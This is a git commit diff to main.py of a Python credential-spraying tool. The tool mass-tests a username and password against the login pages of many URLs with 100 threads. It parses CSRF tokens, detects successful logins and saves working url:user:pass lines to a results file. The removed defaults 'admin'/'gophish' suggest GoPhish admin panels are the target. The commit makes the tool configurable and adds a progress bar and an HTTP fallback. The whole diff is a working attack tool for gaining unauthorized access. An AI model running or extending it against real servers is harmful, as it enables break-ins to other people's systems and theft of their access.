edf269c51813c2cc28127f9826e7a5b51b928267
alimuhammadsecured <164618346+BestDevOfc@users.noreply.github.com>
2024-12-27 07:00:12 -0500

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,4 @@
+import os
 import logging
 import urllib3
 import urllib.parse
@@ -8,6 +9,7 @@ import requests
 
 from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore, Style
+from tqdm import tqdm
 
 
 # some initialization shenanigans
@@ -18,6 +20,7 @@ logging.basicConfig(
     format='%(asctime)s [%(levelname)s] %(message)s',
     datefmt='%Y-%m-%d %H:%M:%S'
 )
+logging.basicConfig(level=logging.ERROR)
 # Suppress the InsecureRequestWarning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -31,7 +34,7 @@ class Sprayer(object):
         self.password = None
         self.urls = []
         self.headers = json.loads(open("headers.json").read())
-
+        self.pbar = None
     def normalize_url(self, url):
         '''
         1) urldecode & strip
@@ -44,7 +47,7 @@ class Sprayer(object):
         if '/' in url:
             url = url.split('/')[0]
 
-        url = f"https://{url}"
+        url = f"http://{url}"
         return url
 
     def login(self, url):
@@ -54,16 +57,20 @@ class Sprayer(object):
             try:                
                 # parse the CSRF token:
                 req = session.get(url=f"{url}/login?next=%2F", verify=False, headers=self.headers, timeout=60)
-
+                if 'Client sent an HTTP request to an HTTPS server.' in req.text:
+                    url = f"https://{url}".replace("http://", '')
+                    continue
+                
                 # input(f"{session.cookies}")
 
-                # open("lmao.html", 'wb').write(req.content)
+                
                 CSRF_token = req.text.split('name="csrf_token" value="', 1)[1].split('"')[0].strip().rstrip().replace("&#43;", '+')
                 CSRF_token = urllib.parse.quote(CSRF_token)
                 # print(f"[ CSRF Token ]: {CSRF_token}")
 
                 # Attempt the login:
                 headers = self.headers
+                headers['referer'] = url
                 # NOTE: spent like 30 minutes debugging, forgot that forms need to have this content-type or server doesn't understand
                 # the data we're sending it
                 # headers["content-Type"] = f"application/x-www-form-urlencoded"
@@ -72,20 +79,24 @@ class Sprayer(object):
                 )
                 req = session.post(url=f"{url}/login", headers=headers, verify=False, data=data, timeout=60)
                 if req.status_code == 401: # Login failed
-                    print(f"[ Login Failed! ]")
+                    # print(f"[ Login Failed! ]")
                     pass
-                elif req.status_code == 302: # login succeeded
+                elif 'href="/logout">' in req.text:
                     valid_line = f"[ ({url})|{self.username}:{self.password} ]"
                     self.results_file.write(f"{valid_line}\n")
                     self.results_file.flush()
                     print(f"{Fore.GREEN}{Style.BRIGHT}{valid_line}")
                 elif req.status_code == 429: # rate-limited
-                    print(f"[ Rate-Limited ! ]")
+                    # print(f"{url}")
+                    # print(f"[ Rate-Limited ! ]")
+                    pass
+                elif "Forbidden - referer invalid" in req.text: # not really sure what this means as of yet
+                    # print(f"[ Weird forbidden thing ]")
                     pass
                 else: # unknown
-                    open(f"{time.time()}-unknown.html", 'wb').write(req.content)
+                    open(f"{time.time()}-unknown.html", 'w').write(f"HERE: {url}\n\n{req.text}")
                     
-
+                self.pbar.update()
                 break
             except Exception as err:
                 # print(f"{Fore.RED}{err}")
@@ -94,10 +105,19 @@ class Sprayer(object):
 
 
     def main(self):
+        if not os.path.isfile("urls.txt"):
+            print(f"{Fore.RED}[ Please put URLs in the \'urls.txt\' file! ]")
+            return
+
         self.urls = list(set(open("urls.txt").readlines()))
-        # self.password = input(f"[ Password to spray with ]: ").strip().rstrip()
-        # self.username = input(f"[ Username to spray with : ]").strip().rstrip()
-        self.username, self.password = "admin", "gophish"
+        if len(self.urls) == 0:
+            print(f"{Fore.RED}[ Please put URLs in the \'urls.txt\' file! ]")
+            return
+
+        self.username = input(f"[ Username to spray with ]: ").strip().rstrip()
+        self.password = input(f"[ Password to spray with ]: ").strip().rstrip()
+        
+
 
         print(f"[ Normalizing Urls... ]")
         normalized = []
@@ -110,6 +130,9 @@ class Sprayer(object):
         self.urls = normalized
         normalized = []
         
+        # setup the progress bar
+        self.pbar = tqdm(total=len(self.urls), desc="Spraying Panels")
+
         with ThreadPoolExecutor(max_workers=100) as executor:
             executor.map(self.login, self.urls)
 
